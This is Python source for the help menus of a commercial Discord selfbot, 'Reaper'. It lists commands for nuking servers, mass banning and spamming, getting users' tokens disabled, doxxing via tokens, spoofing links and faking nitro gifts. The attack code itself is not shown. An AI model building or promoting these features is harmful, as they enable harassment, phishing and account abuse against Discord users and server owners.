class HelpCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def help(self, ctx, page: int = 1):
        if await disableCmd(ctx) == 0: return
        try:
            if page == 2:
                emb=discord.Embed(
                    colour=emcolor,
                    timestamp=datetime.utcnow())
                fields = [
                    {'name': '🖍 *`COLOR COMMANDS`*', 'value': f"`{prefix}colortext`\nShows all colortext commands", 'inline': True},
                    {'name': '💸 *`INVOICE COMMANDS`*', 'value': f"`{prefix}payments`\nShows all invoice commands", 'inline': True},
                    {'name': '🌐 *`SERVER COMMANDS`*', 'value': f"`{prefix}server`\nShows all server commands", 'inline': True},
                    {'name': '🎞 *`ANIMATION COMMANDS`*', 'value': f"`{prefix}textanim`\nShows all text animation commands", 'inline': True},
                    {'name': '⌨ *`FANCY TEXTS COMMANDS`*', 'value': f"`{prefix}fancytext`\nShows all fancy text commands", 'inline': True},
                    {'name': '♥ *`CREDITS`*', 'value': f"`{prefix}credits`\nCredits for the creation of the selfbot", 'inline': True},
                    {'name': '_ _', 'value': f"_ _", 'inline': False},
                    {'name': '_ _', 'value': f"More commands coming soon...", 'inline': True},
                    {'name': '_ _', 'value': f"_ _", 'inline': True}
                ]
                for field in fields:
                    if field['name']:
                        emb.add_field(name=field["name"], value=field["value"], inline=field['inline'])
                emb.set_author(
                    name=f"Reaper Selfbot Commands (Page 2/2) | Prefix: {prefix}", 
                    icon_url=f"{emimage}", 
                    url="https://discord.gg/rQJZDpaxv6")\
                    .set_footer(text=footer)\
                    .set_image(url=emimagealt)
                    #.set_thumbnail(url=emimage)
                await ctx.send(embed=emb, delete_after=delinterval)
                await ctx.message.delete()
            else:
                emb=discord.Embed(
                    colour=emcolor,
                    timestamp=datetime.utcnow())
                fields = [
                    {'name': "💬 *`TEXT COMMANDS`*", 'value': f"`{prefix}text`\nShows all fun commands.", 'inline': True},
                    {'name': "🎈 *`FUN COMMANDS`*", 'value': f"`{prefix}fun`\nShows all fun commands.", 'inline': True},
                    {'name': '⚙ *`TOOLS COMMANDS`*', 'value': f"`{prefix}tools`\nShows all tools", 'inline': True},
                    {'name': '🛠 *`ADMIN COMMANDS`*', 'value': f"`{prefix}admin`\nShows all moderation commands", 'inline': True},
                    {'name': '🔱 *`USER COMMANDS`*', 'value': f"`{prefix}user`\nShows all user commands", 'inline': True},
                    {'name': '🧮 *`MATH COMMANDS`*', 'value': f"`{prefix}math`\nShows all math commands", 'inline': True},
                    {'name': '💎 *`PREMIUM COMMANDS`*', 'value': f"`{prefix}premium`\nShows all premium commands", 'inline': True},
                    {'name': '⚖️ *`ABUSE COMMANDS`*', 'value': f"`{prefix}abuse`\nShows all abuse commands", 'inline': True},
                    {'name': '🎱 *`MISC COMMANDS`*', 'value': f"`{prefix}misc`\nShows all miscellaneous commands", 'inline': True},
                    {'name': '🔞 *`NSFW COMMANDS`*', 'value': f"`{prefix}nsfw`\nShows all nsfw commands", 'inline': True},
                    {'name': '🌫️ *`IMAGE COMMANDS`*', 'value': f"`{prefix}image`\nShows all image commands", 'inline': True},
                    {'name': '🖨 *`ENCODING COMMANDS`*', 'value': f"`{prefix}encoding`\nShows all string encoding commands", 'inline': True}
                ]
                for field in fields:
                    if field['name']:
                        emb.add_field(name=field["name"], value=field["value"], inline=field['inline'])
                emb.set_author(
                    name=f"Reaper Selfbot Commands (Page 1/2) | Prefix: {prefix}", 
                    icon_url=f"{emimage}", 
                    url="https://discord.gg/rQJZDpaxv6")\
                    .set_footer(text=footer)\
                    .set_image(url=emimagealt)
                    #.set_thumbnail(url=emimage)
                await ctx.send(embed=emb, delete_after=delinterval)
                await ctx.message.delete()
            cmdused('help')
        except Exception as e:
            print(e)

    @commands.command()
    async def fun(self, ctx, page: int = 1):
        if await disableCmd(ctx) == 0: return
        if page == 1:
            embed=discord.Embed(
                description=f'''**`{prefix}spoiler [query]`**\nSpoiler tag. Eg: *{prefix}spoiler Some book | They get married.*
                **`{prefix}xkcd [comic]`**\nSearches comics from xkcd
                **`{prefix}countdown [number] -embed|-text`**\nCounts down from an (x) amount of number to 0, defaults at 15
                **`{prefix}would-you-rather`**\nSends a random would-you-rather
                **`{prefix}topic`**\nAsks a random topic to start a conversation
                **`{prefix}hypesquad [bravery|brilliance|balance|random]`**\nSets your hypesquad badge on your profile
                **`{prefix}useless-fact <de|en>`**\nFinds a random fact from available languages: `de`, `en`.
                **`{prefix}quote`**\nGenerates a random quote
                **`{prefix}urbandict`**\nLooks up shit on urban dictionary
                **`{prefix}passwordgen [length]`**\nGenerates a secure password for you
                **`{prefix}reminder [time]`**\nReminds you with a pop up notification on windows. (time example: `15s 2m 3h`)
                **`{prefix}dadjoke`**\nSends a random dad joke
                **`{prefix}imgsearch [query]`**\nSearches an image online
                **`{prefix}gifsearch [query]`**\nSearches a gif online
                **`{prefix}slots`**\nPlay a game of slot machine
                **`{prefix}covid-stats`**\nShows the global covid stats
                **`{prefix}minesweeper`**\nPlay a game of minesweeper
                **`{prefix}imgsearch [query]`**\nSearches an image online''',
                color=emcolor,
                timestamp=datetime.utcnow())\
                .set_author(
                name=f"Reaper Fun Commands (Page 1/2) | Prefix: {prefix}", 
                icon_url=f"{emimage}", 
                url="https://discord.gg/rQJZDpaxv6")\
                .set_footer(text=footer)\
                .set_thumbnail(url=emimage)\
                .set_image(url=emimagealt)
            await ctx.send(embed=embed, delete_after=delinterval)
        elif page == 2:
            embed=discord.Embed(
                description=f'''**`{prefix}notfunny`**\nShows someone how unfunny they are
                **`{prefix}8ball [question]`**\nMagic 8ball
                **`{prefix}auto-bump [#channel]`**\nAuto types "!d bump" every 2 hours to bump your server
                **`{prefix}tts [message]`**\nMakes a .wav tts audio from a message
                **`{prefix}eyerape [amount]`**\nSpams random a colorful gifs
                **`{prefix}get-color [color/hex]`**\nSends the given color/hex
                **`{prefix}choice 'choice1' | 'choice2'..`**\nRandomly picks from your choices
                **`{prefix}howgay [@user]`**\nShows how gay someone is
                **`{prefix}abc`**\nEdits a message starting from 'a' to 'z' from the alphabet
                **`{prefix}howsimp [@user]`**\nShows how much of a simp someone is
                **`{prefix}iq [@user]`**\nShows a user's IQ
                **`{prefix}dick [@user]`**\nShows how long a user's dick is
                **`{prefix}ytcomment [msg]`**\nSay something as a youtube comment
                **`{prefix}randomgif`**\nSends a random tenor gif
                **`{prefix}randomsc`**\nSends a random lightshot screenshot
                **`{prefix}gifsearch [query]`**\nSearches a gif online''',
                color=emcolor,
                timestamp=datetime.utcnow())\
                .set_author(
                name=f"Reaper Fun Commands (Page 2/2) | Prefix: {prefix}", 
                icon_url=f"{emimage}", 
                url="https://discord.gg/rQJZDpaxv6")\
                .set_footer(text=footer)\
                .set_thumbnail(url=emimage)\
                .set_image(url=emimagealt)
            await ctx.send(embed=embed, delete_after=delinterval)
        await ctx.message.delete()
        cmdused('fun')

    @commands.command()
    async def image(self, ctx):
        if await disableCmd(ctx) == 0: return
        embed = discord.Embed(
            description=f"""**`{prefix}trumptweet`**\nTweets something as trump
            **`{prefix}tweet [msg]`**\nTweet Something
            **`{prefix}ytcomment [msg]`**\nSay something as a youtube comment
            **`{prefix}baguette`**\nRandom baguette image
            **`{prefix}cat`**\nRandom Cat Image
            **`{prefix}dog`**\nRandom Dog Image
            **`{prefix}koala`**\nRandom Koala Image
            **`{prefix}panda`**\nRandom Panda Image
            **`{prefix}fox`**\nRandom Fox Image
            **`{prefix}feed`**\nSends a random (SFW) anime feed gif
            **`{prefix}tickle`**\nSends a random (SFW) anime tickle gif
            **`{prefix}slap`**\nSends a random (SFW) anime slap gif
            **`{prefix}hug`**\nSends a random (SFW) anime hug gif
            **`{prefix}smug`**\nSends a random (SFW) anime smug gif
            **`{prefix}pat`**\nSends a random (SFW) anime pat gif
            **`{prefix}kiss`**\nSends a random (SFW) anime kiss gif""",
            color=emcolor,
            timestamp=datetime.utcnow()
        )
        embed.set_author(name=f"Reaper Image Commands | Prefix: {prefix}", icon_url=f"{emimage}", url="https://discord.gg/rQJZDpaxv6")
        embed.set_footer(text=footer)
        embed.set_thumbnail(url=emimage)
        embed.set_image(url=emimagealt)
        await ctx.message.delete()
        await ctx.send(embed=embed, delete_after=delinterval)
        cmdused('image')

    @commands.command()
    async def abuse(self, ctx):
        if await disableCmd(ctx) == 0: return
        embed=discord.Embed(
            description=f'''**`{prefix}destroyserver`** ⚠\n Nukes a discord server. (RISKY)
            **`{prefix}dmall [msg]`** ⚠\n DMs everyone in a server, if more then 25+ people (RISKY)
            **`{prefix}tokenfucker [token]`**\nMesses up a user token and attempts to get it to be disabled (RISKY)
            **`{prefix}randomping [indefinite: bool] <amount>`**\nRandomly mentions 5 people in the server (no perms needed)
            **`{prefix}sendallchannels [indefinite: bool] [message]`**\nSends a message in all of the channels (no perms needed)
            **`{prefix}massban`**\nBans everyone in the server 
            **`{prefix}masskick`**\nKicks everyone in the server
            **`{prefix}massrole`**\nCreates many roles to possibly crash the server
            **`{prefix}masschannel`**\nSpams channels in a server
            **`{prefix}massunban`**\nUnbans everyone in a server
            **`{prefix}delchannels`**\nDeletes all channels in a server
            **`{prefix}delroles`**\n Deletes all roles in a server''',
            color=emcolor,
            timestamp=datetime.utcnow()
        )
        embed.set_author(name=f"Reaper Abuse Commands | Prefix: {prefix}", icon_url=f"{emimage}", url="https://discord.gg/rQJZDpaxv6")
        embed.set_footer(text=footer)
        embed.set_thumbnail(url=emimage)
        embed.set_image(url=emimagealt)
        cmdused('abuse')
        await ctx.message.delete()
        await ctx.send(embed=embed, delete_after=delinterval)

    @commands.command(name="server", aliases=["guild"])
    async def _server(self, ctx):
        if await disableCmd(ctx) == 0: return
        IIllIlIIl = lambda m, n: f"**`{prefix}{m}`**\n{n}"
        await ctx.send(embed=discord.Embed(
            description=f'''{IIllIlIIl("rainbow-role [role]", "Changes color for a role every 10 seconds")}
            {IIllIlIIl("guild-icon", "Sends the current server's icon")}
            {IIllIlIIl("levelsgrind [times]", "Sends messages every few minutes to level up in discord servers")}
            {IIllIlIIl("destroyserver", "Spams channels, webhooks, messages, etc.. on a server. (RISKY)")}
            {IIllIlIIl("copyserver", "Creates a new server and copies everything in the current one (buggy)")}
            {IIllIlIIl("auto-bump [amount]", "Bumps a server for an x amount of times")}
            {IIllIlIIl("levelsgrind [times]", "Sends messages every few minutes to level up in discord servers")}
            {IIllIlIIl("role-info [role]", "Checks information for a role")}''',
            timestamp=datetime.utcnow(),
            color=emcolor)
            .set_author(name="Reaper Server Commmands", icon_url=emimage)\
            .set_thumbnail(url=emimage)\
            .set_image(url=emimagealt),
            delete_after=delinterval)
        await ctx.message.delete()
        cmdused('server')

    @commands.command(aliases=["payment"])
    async def payments(self, ctx):
        if await disableCmd(ctx) == 0: return
        try:
            self.getp = lambda m: config["Payments"][m]["Name"]
            p = prefix
            await ctx.send(embed=discord.Embed(
                description=
                f'''**`{p}paypal [amount]`**\nMakes a paypal invoice
                **`{p}cashapp [amount]`**\nMakes a cashapp invoice
                **`{p}venmo [amount]`**\nMakes a venmo invoice
                **`{p}btc-invoice [amount]`**\nMakes a bitcoin invoice
                **`{p}ltc-invoice [amount]`**\nMakes a litecoin invoice
                **`{p}eth-invoice [amount]`**\nMakes a etherium invoice
                **`{p}xmr-invoice [amount]`**\nMakes a monero invoice''',
                color=emcolor,
                timestamp=datetime.utcnow())\
                .set_author(name=f"Reaper Payment Commands | Prefix: {prefix}", icon_url=f"{emimage}")\
                .set_footer(text=footer)\
                .set_thumbnail(url=emimage)\
                .set_image(url=emimagealt),delete_after=delinterval)
            await ctx.message.delete()
        except:
            await ctx.message.delete()
        cmdused("payments")
    
    @commands.command()
    async def textanim(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.send(embed=discord.Embed(
            color=emcolor,
            timestamp=datetime.utcnow(),
            description=f'''**`{prefix}cathi [text]`**\nMakes a cat getting out of a box animation with a custom text (default: hi!)
            **`{prefix}bomb`**\nA line to a bomb
            **`{prefix}selfdestruct`**\nCountdown to a self destruct animation
            **`{prefix}virus [@user] [virus-name]`**\nInject a virus to a user animation
            **`{prefix}hack [@user]`**\nHacks a user (animation only)
            **`{prefix}flop`**\nFlop.
            **`{prefix}poof`**\nPoofness
            **`{prefix}tableflipped`**\nTable flipped animation
            **`{prefix}warning`**\nSYSTEM OVERLOADED!!11!!''')\
            .set_footer(text=footer)\
            .set_author(name="Reaper Text Animation Commands", icon_url=emimage)\
            .set_thumbnail(url=emimage)\
            .set_image(url=emimagealt), delete_after=delinterval)
        await ctx.message.delete()
        cmdused("textanim")

    @commands.command()
    async def premium(self, ctx):
        if await disableCmd(ctx) == 0: return
        embed=discord.Embed(
            description=
            #**`{prefix}csgocheats`**\nInjects cheats for CSGO
            #**`{prefix}nitrochecker [amount]`**\nGenerates and checks nitro codes.
            f'''**`{prefix}pencrypt`**\nEncrypts a message in sb premium encryption
            **`{prefix}pdecrypt`**\nDecrypts a message in sb premium encryption
            **`{prefix}fakenitro [link]`**\nCreates a fake nitro with a link redirected to [link].
            **`{prefix}copy <user>`**\nCopies someone's messages (toggleable)
            **`{prefix}copyserver`**\nCreates a new server and copies everything in the current one (buggy)
            **`{prefix}ebay-view [url] [amount]`**\nEBay view bot
            **`{prefix}geoip [ip]`**\nGets a geo-location of an IP address
            **`{prefix}linkspoof [link1] [link2]`**\nMakes link1 redirect to link2
            **`{prefix}invisping [@user] [msg]`**\nMentions someone without having the @mention in the message
            **`{prefix}gennitro [amount]`**\nCreates nitro codes and stores it in a .txt
            **`{prefix}destroyserver`** ⚠\n Nukes a discord server. (VERY RISKY)
            **`{prefix}tokenfucker [token]`**\nMesses up a user token and attempts to get it to be disabled (RISKY)''',
            color=emcolor,
            timestamp=datetime.utcnow()
        )
        embed.set_author(name=f"Reaper Premium Commands | Prefix: {prefix}", icon_url=f"{emimage}", url="https://discord.gg/rQJZDpaxv6")
        embed.set_footer(text=footer)
        embed.set_thumbnail(url=emimage)
        embed.set_image(url=emimagealt)
        cmdused('premium')
        await ctx.message.delete()
        await ctx.send(embed=embed, delete_after=delinterval)

    @commands.command(aliases=["encrypting"])
    async def encoding(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        await ctx.send(embed=discord.Embed(
            color=emcolor,
            timestamp=datetime.utcnow(),
            description=f'''**`{prefix}base16 <encode|decode> [text]`**\nEncodes/decodes text in base16 encoding
            **`{prefix}base32 <encode|decode> [text]`**\nEncodes/decodes text in base32 encoding
            **`{prefix}base64 <encode|decode> [text]`**\nEncodes/decodes text in base64 encoding
            **`{prefix}base85 <encode|decode> [text]`**\nEncodes/decodes text in base85 encoding
            **`{prefix}ascii85 <encode|decode> [text]`**\nEncodes/decodes text in ascii85 encoding''')\
            .set_footer(text=footer)\
            .set_author(
             name="Reaper Encoding Commands",
             icon_url=emimage)\
            .set_thumbnail(url=emimage)\
            .set_image(url=emimagealt)
            ,delete_after=delinterval)
        cmdused('encoding')

    @commands.command()
    async def user(self, ctx):
        if await disableCmd(ctx) == 0: return
        embed=discord.Embed(
            description=f'''**`{prefix}playing [text]`**\nSets a custom playing status
            **`{prefix}listening [text]`**\nSets a custom listening status
            **`{prefix}watching [text]`**\nSets a custom watching status
            **`{prefix}streaming [twitch-url] [text]`**\nSets a custom twitch streaming status
            **`{prefix}hypesquad [bravery|brilliance|balance|random]`**\nSets your hypesquad badge on your profile
            **`{prefix}rainbow-role [role]`**\nChanges color for a role every 10 seconds
            **`{prefix}group-leaver`**\nLeaves all group DMs
            **`{prefix}howgay [@user]`**\nShows how gay someone is
            **`{prefix}howsimp [@user]`**\nShows how much of a simp someone is
            **`{prefix}iq [@user]`**\nShows a user's IQ
            **`{prefix}dick [@user]`**\nShows how long a user's dick is
            **`{prefix}spam [amount] [msg]`**\nSpams a message for a certain amount of times
            **`{prefix}gping [@user] [amount]`**\nPings the user and deletes the message after
            **`{prefix}tdox [Token]`**\nShows everything associated with the token
            **`{prefix}userinfo [@user]`**\nShows info for a user (SERVER ONLY)
            **`{prefix}userinfodm [@user]`**\nShows info for a user (DMS AND GROUPS ONLY)
            **`{prefix}avatar [@user]`**\nShows a user's avatar
            **`{prefix}findip [@user]`**\nFinds a user's IP (fake)
            **`{prefix}hack [@user]`**\nHacks a user (fake)
            **`{prefix}msg-info [msg-id] <#channel>`**\nChecks information for a message''',
            color=emcolor,
            timestamp=datetime.utcnow()
        )
        embed.set_author(name=f"Reaper User Commands | Prefix: {prefix}", icon_url=f"{emimage}", url="https://discord.gg/rQJZDpaxv6")
        embed.set_footer(text=footer)
        embed.set_thumbnail(url=emimage)
        embed.set_image(url=emimagealt)
        cmdused('user')
        await ctx.message.delete()
        await ctx.send(embed=embed, delete_after=delinterval)

    @commands.command()
    async def math(self, ctx):
        if await disableCmd(ctx) == 0: return
        embed=discord.Embed(
            description=f"""**`{prefix}add [num1] [num2]`**\nSends the sum the given numbers.
            **`{prefix}subtract  [num1] [num2]`**\nSends the difference the given numbers.
            **`{prefix}multiply [num1] [num2]`**\nSends the product the given numbers.
            **`{prefix}divide [num1] [num2]`**\nSends the quotient the given numbers.
            **`{prefix}square [num1] [num2]`**\nSends the squared answer from the given numbers.""",
            color=emcolor,
            timestamp=datetime.utcnow()
        )
        embed.set_author(name=f"Reaper Math Commands | Prefix: {prefix}", icon_url=f"{emimage}", url="https://discord.gg/rQJZDpaxv6")
        embed.set_footer(text=footer)
        embed.set_thumbnail(url=emimage)
        embed.set_image(url=emimagealt)
        cmdused('math')
        await ctx.message.delete()
        await ctx.send(embed=embed, delete_after=delinterval)

    @commands.command()
    async def tools(self, ctx):
        if await disableCmd(ctx) == 0: return
        embed=discord.Embed(
            description=f'''**`{prefix}sysinfo`**\nShows the client computer's info
            **`{prefix}shutdown`**\nShuts down your computer
            **`{prefix}cls`**\nClears the console
            **`{prefix}tinyurl [http]`**\nCreates a shortened link
            **`{prefix}status`**\nShows the selfbot's current status
            **`{prefix}cmd`**\nOpens command prompt
            **`{prefix}calc`**\nOpens calculator
            **`{prefix}closesb`**\nExits Reaper SB
            **`{prefix}ping`**\nPings discord
            **`{prefix}pingweb [http]`**\nPings a web and returns the status code
            **`{prefix}uptime`**\nShows you how long Reaper has been open''',
            color=emcolor,
            timestamp=datetime.utcnow()
        )
        embed.set_author(name=f"Reaper Tool Commands | Prefix: {prefix}", icon_url=f"{emimage}", url="https://discord.gg/rQJZDpaxv6")
        embed.set_footer(text=footer)
        embed.set_thumbnail(url=emimage)
        embed.set_image(url=emimagealt)
        cmdused('tools')
        await ctx.message.delete()
        await ctx.send(embed=embed, delete_after=delinterval)

    @commands.command()
    async def admin(self, ctx):
        if await disableCmd(ctx) == 0: return
        emb=discord.Embed(
            description=f'Current prefix is `{prefix}`\n\n'
            f"""**`{prefix}ban [User] [Reason]`**\nBans a user from a Discord Server
            **`{prefix}unban [User]`**\nUnbans a user from a Discord Server
            **`{prefix}kick [User] [Reason]`**\nKicks a user from a Discord Server
            **`{prefix}nukechat`**\nClones a chat a deletes the old one
            **`{prefix}purgechat [amount]`**\nPurges a Discord channel by deleting all Messages""",
            colour=emcolor,
            timestamp=datetime.utcnow())
        emb.set_author(name=f"Reaper Moderation Commands | Prefix: {prefix}", icon_url=f"{emimage}", url="https://discord.gg/rQJZDpaxv6")
        emb.set_footer(text=footer)
        emb.set_thumbnail(url=emimage)
        emb.set_image(url=emimagealt)
        cmdused('admin')
        await ctx.message.delete()
        await ctx.send(embed=emb, delete_after=delinterval)

    @commands.command()
    async def text(self, ctx, page: int = 1):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        if page == 1:
            embed=discord.Embed(
                description=f'''**`{prefix}markdown [text]`**\nWrite in `markdown` format
                **`{prefix}spam [amount] [msg]`**\nSpams a message for a certain amount of times
                **`{prefix}gping [@user] [amount]`**\nPings the user and deletes the message after
                **`{prefix}shrug <msg>`**\nSends a shrug emote
                **`{prefix}lenny <msg>`**\nSends a lenny emote
                **`{prefix}tableflip`**\nSends a tableflip emote
                **`{prefix}unflip`**\nSends an unflip emote
                **`{prefix}first-msg`**\nChecks for a channel's first message
                **`{prefix}upper [msg]`**\nTurns all of the letters on your message to uppercase
                **`{prefix}lower [msg]`**\nTurns all of the letters on your message to lowercase
                **`{prefix}devowel [msg]`**\nRemoves all the vowels on your message''', 
                #**`{prefix}textgif [text]`**\nTurns text to gif
                # **`{prefix}translate [text]`**\nTranslates a message to english
                color=emcolor,
                timestamp=datetime.utcnow()
            )
            embed.set_author(name=f"Reaper Text Commands (Page 1/2) | Prefix: {prefix}", icon_url=f"{emimage}", url="https://discord.gg/rQJZDpaxv6")
            embed.set_footer(text=footer)
            embed.set_thumbnail(url=emimage)
            embed.set_image(url=emimagealt)
            await ctx.send(embed=embed, delete_after=delinterval)
        elif page == 2:
            embed=discord.Embed(
                description=f'''**`{prefix}reverse [msg]`**\nInverts the position of characters in your message
                **`{prefix}purge [amount]`**\nDeletes an amount of sent messages (self)
                **`{prefix}purgeall`**\nPurges all 1000 text at a time (self)
                **`{prefix}clap [msg]`**\nReplaces vowels with \\👏
                **`{prefix}1337 [msg]`**\n1337 speak
                **`{prefix}bigtext [msg]`**\nFormats text with regional indicator
                **`{prefix}embed [text]`**\nCreates an embed with selected text
                **`{prefix}ascii [text]`**\nFormats a text in large font
                **`{prefix}rbembed [text]`**\nMakes a rainbow embed
                **`{prefix}textflip [text]`**\nFlips the given text upside down
                **`{prefix}spacetext [text]`**\nSeparates text with space
                **`{prefix}clearchat`**\nSends a large message with only spaces''', 
                # **`{prefix}translate [text]`**\nTranslates a message to english
                color=emcolor,
                timestamp=datetime.utcnow()
            )
            embed.set_author(name=f"Reaper Text Commands (Page 2/2) | Prefix: {prefix}", icon_url=f"{emimage}", url="https://discord.gg/rQJZDpaxv6")
            embed.set_footer(text=footer)
            embed.set_thumbnail(url=emimage)
            embed.set_image(url=emimagealt)
            await ctx.send(embed=embed, delete_after=delinterval)
            
        cmdused('text')

    @commands.command(aliases=['miscellaneous'])
    async def misc(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        embed=discord.Embed(
            description=f'''**`{prefix}ytlookup [search]`**\nSearch for videos on YouTube
            **`{prefix}msg-info [msg-id] <#channel>`**\nChecks information for a message
            **`{prefix}emoji-info [emoji/id]`**\nChecks information for an emoji
            **`{prefix}uni [emoji/symbol]`**\nConvert to unicode emoji if possible. 
            **`{prefix}role-color [role]`**\nSends the hex color of a given role
            **`{prefix}markasread`**\nMarks every message as read
            **`{prefix}friend-backup`**\nBacks up your friends in a .txt
            **`{prefix}server-backup`**\nBacks up your servers in a .txt
            **`{prefix}first-msg`**\nChecks for a channel's first message
            **`{prefix}mac [query]`**\nMAC Lookup
            **`{prefix}get-color [color/hex]`**\nSends the given color/hex
            **`{prefix}abc`**\nEdits a message starting from 'a' to 'z' from the alphabet
            **`{prefix}btc`**\nCurrent bitcoin price in USD and EUR
            **`{prefix}eth`**\nCurrent etherium price in USD and EUR
            **`{prefix}ltc`**\nCurrent litecoin price in USD and EUR
            **`{prefix}hastebin [text]`**\nCreates a hastebin with the given text
            **`{prefix}nitro [amount]`**\nSends random nitro codes in chat''', 
            color=emcolor,
            timestamp=datetime.utcnow())
        embed.set_author(name=f"Reaper Miscellaneous Commands | Prefix: {prefix}", icon_url=f"{emimage}", url="https://discord.gg/rQJZDpaxv6")
        embed.set_footer(text=footer)
        embed.set_thumbnail(url=emimage)
        embed.set_image(url=emimagealt)
        cmdused('misc')
        await ctx.send(embed=embed, delete_after=delinterval)

    @commands.command()
    async def nsfw(self, ctx):
        if await disableCmd(ctx) == 0: return
        emb=discord.Embed(
            description=f'Current prefix is `{prefix}`\n\n'
            f"""**`{prefix}boobs`**\nShows a random picture of Boobies
            **`{prefix}tits`**\nShows a random picture of tits
            **`{prefix}feet`**\nShows a random picture of feet
            **`{prefix}erofeet`**\nShows a random picture of erofeet
            **`{prefix}pussy`**\nShows a random picture of a pussy
            **`{prefix}anal`**\nShows a random Anal picture/gif
            **`{prefix}blowjob`**\nSends a random blowjob
            **`{prefix}lesbian`**\nShows a random lesbian image/gif
            **`{prefix}lewdneko`**\nSends a random lewd neko image
            **`{prefix}hentai`**\nSends a random hentai image/gif""",
            colour=emcolor,
            timestamp=datetime.utcnow()
            )
        emb.set_author(name=f"Reaper NSFW Commands | Prefix: {prefix}", icon_url=f"{emimage}", url="https://discord.gg/rQJZDpaxv6")
        emb.set_footer(text=footer)
        emb.set_thumbnail(url=emimage)
        emb.set_image(url=emimagealt)
        cmdused('nsfw')
        await ctx.message.delete()
        await ctx.send(embed=emb, delete_after=delinterval)

        emb=discord.Embed(
            description=f'Current prefix is `{prefix}`\n\n'
            f"""**`{prefix}boobs`**\nShows a random picture of Boobies
            **`{prefix}tits`**\nShows a random picture of tits
            **`{prefix}feet`**\nShows a random picture of feet
            **`{prefix}erofeet`**\nShows a random picture of erofeet
            **`{prefix}pussy`**\nShows a random picture of a pussy
            **`{prefix}anal`**\nShows a random Anal picture/gif
            **`{prefix}blowjob`**\nSends a random blowjob
            **`{prefix}lesbian`**\nShows a random lesbian image/gif
            **`{prefix}lewdneko`**\nSends a random lewd neko image
            **`{prefix}hentai`**\nSends a random hentai image/gif""",
            colour=emcolor,
            timestamp=datetime.utcnow()
            )
        emb.set_author(name=f"Reaper NSFW Commands | Prefix: {prefix}", icon_url=f"{emimage}", url="https://discord.gg/rQJZDpaxv6")
        emb.set_footer(text=footer)
        emb.set_thumbnail(url=emimage)
        emb.set_image(url=emimagealt)
        cmdused('nsfw')
        await ctx.message.delete()
        await ctx.send(embed=emb, delete_after=delinterval)

class Ungrouped(commands.Cog):
    def __init__(self, bot):
        self.bot=bot

    @commands.command()
    async def credits(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        embed=discord.Embed(
            title='Reaper Selfbot',
            description='Reaper Selfbot is an affordable, easy to use while being fully customizable selfbot. '
            'Reaper is made by the Reaper team, we intend to be the leading Selfbot seller out there so we will '
            'continue to bring you new features continuously. Head to our [online store](https://shoppy.gg/@ReaperSelfBot) '
            'to buy Reaper Selfbot for $15 USD VIP or $10 USD for Standard. To be notified for updates, sales and '
            'changelog\'s or to suggested more features to add, join our [Community Discord Server](https://discord.gg/rQJZDpaxv6).',
            color=emcolor
        )
        
        fields = [
            {'name': 'Purchase Reaper', 'value': '[Click Here](https://shoppy.gg/@ReaperSelfBot)'},
            {'name': 'Reaper Website', 'value': '[Click Here](https://reaperselfbot.weebly.com/)'},
            {'name': 'Community Discord', 'value': '[Click Here](https://discord.gg/rQJZDpaxv6)'},
            {'name': 'Version', 'value': f'v{REAPER.__version__}'}
        ]

        for field in fields:
            if field['value']:
                embed.add_field(name=field['name'], value=field['value'], inline=True)

        cmdused('credits')
        embed.set_footer(text=f'{footer} | By mutefx and Mrnonfatal')
        return await ctx.send(embed=embed, delete_after=delinterval)

class Encoding(commands.Cog):
    def __init__(self, bot):
        self.client = bot
        self.b16_en = lambda m: base64\
            .b16encode(m\
            .encode('ascii'))\
            .decode('ascii')
        self.b16_de = lambda m: base64\
            .b16decode(m\
            .encode('ascii'))\
            .decode('ascii')
        self.b32_en = lambda m: base64\
            .b32encode(m\
            .encode('ascii'))\
            .decode('ascii')
        self.b32_de = lambda m: base64\
            .b32decode(m\
            .encode('ascii'))\
            .decode('ascii')
        self.b64_en = lambda m: base64\
            .b64encode(m\
            .encode('ascii'))\
            .decode('ascii')
        self.b64_de = lambda m: base64\
            .b64decode(m\
            .encode('ascii'))\
            .decode('ascii')
        self.b85_en = lambda m: base64\
            .b85encode(m\
            .encode('ascii'))\
            .decode('ascii')
        self.b85_de = lambda m: base64\
            .b85decode(m\
            .encode('ascii'))\
            .decode('ascii')
        self.a85_en = lambda m: base64\
            .a85encode(m\
            .encode('ascii'))\
            .decode('ascii')
        self.a85_de = lambda m: base64\
            .a85decode(m\
            .encode('ascii'))\
            .decode('ascii')
        self.format = lambda m: m.replace("*", "\\*").replace("_", "\\_")\
            .replace("`", "\\`").replace("~", "\\~")

    def morse_(self, t: bool, m: str): 
        for w in m:
            morse_dict = { 
                'A':'.-',     'B':'-...', 
                'C':'-.-.',   'D':'-..',      'E':'.',
                'F':'..-.',   'G':'--.',      'H':'....',
                'I':'..',     'J':'.---',     'K':'-.-',
                'L':'.-..',   'M':'--',       'N':'-.',
                'O':'---',    'P':'.--.',     'Q':'--.-',
                'R':'.-.',    'S':'...',      'T':'-',
                'U':'..-',    'V':'...-',     'W':'.--',
                'X':'-..-',   'Y':'-.--',     'Z':'--..',
                '1':'.----',  '2':'..---',    '3':'...--',
                '4':'....-',  '5':'.....',    '6':'-....',
                '7':'--...',  '8':'---..',    '9':'----.',
                '0':'-----',  ', ':'--..--',  '.':'.-.-.-',
                '?':'..--..', '/':'-..-.',    '-':'-....-',
                '(':'-.--.',  ')':'-.--.-' }
            if t == True:
                try:
                    c = morse_dict[w]
                    m.replace(w, c)
                except KeyError:
                    continue
                return m
            elif t == False:
                m += ' '
                decipher = '' 
                citext = '' 
                for letter in m: 
                    if (letter != ' '): 
                        i = 0
                        citext += letter
                    else: 
                        i = 0
                        i += 1
                        if i == 2 : 
                            decipher += ' '
                        else: 
                            decipher += list(morse_dict.keys())[list(morse_dict
                            .values()).index(citext)] 
                            citext = '' 
                return decipher

    @commands.command(aliases=["base16"])
    async def b16(self, ctx, t, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        if t.lower() == "encode":
            m = self.format(self.b16_en(args))
            await ctx.send(f"{m}")
            return cmdused(ctx.message.content.split()[0].replace(prefix, ""))
        elif t.lower() == "decode":
            m = self.b16_de(args)
            await ctx.send(f"{m}")
            return cmdused(ctx.message.content.split()[0].replace(prefix, ""))

    @commands.command(aliases=["base32"])
